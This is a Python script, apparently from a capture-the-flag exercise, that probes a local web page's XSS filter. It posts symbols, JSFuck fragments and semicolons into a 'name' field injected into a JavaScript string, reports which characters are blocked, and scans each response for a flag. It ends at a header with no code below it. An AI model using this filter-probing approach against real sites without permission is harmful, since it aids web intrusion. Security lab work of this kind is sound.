import requests
import re

target_url = "http://127.0.0.1:32887/page"

print("[*] Testing if flag appears with specific XSS execution\n")

# Maybe the application checks if certain code is executed
# Let's try payloads that might trigger different responses

# First, let's check if we need to break out of the string context differently
# Currently injected as: var name = "PAYLOAD";

# What if we need to close the string and add actual executable code?
# Since we can't use quotes, semicolons might work if not filtered

test_payloads = [
    # Try numbers and symbols only (these shouldn't be filtered)
    '1',
    '0',
    '[]',
    '()',
    '![]',
    '+[]',
    
    # Very short JSFuck that evaluates to a number
    '+!+[]',  # This evaluates to 1
    '+[]',    # This evaluates to 0
    
    # Test if semicolon works
    ';',
    ';;',
]

print("="*60)
print("Testing basic symbols and operators")
print("="*60)

for payload in test_payloads:
    try:
        resp = requests.post(target_url, data={"name": payload}, timeout=10)
        
        # Check if filtered
        if "Sorry you can't use:" in resp.text:
            filter_msg = re.search(r"Sorry you can't use: '([^']+)'", resp.text)
            if filter_msg:
                print(f"[!] '{payload}' → BLOCKED: '{filter_msg.group(1)}'")
        else:
            print(f"[+] '{payload}' → ALLOWED (len: {len(resp.content)}B)")
            
            # Check for flags
            flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
            if flags:
                print(f"    [!!!] FLAG FOUND: {flags[0]}")
                
    except Exception as e:
        print(f"[-] Error with '{payload}': {e}")

# Now let's check what happens when we view the page source with a browser-like User-Agent
print("\n" + "="*60)
print("Testing with browser User-Agent")
print("="*60)

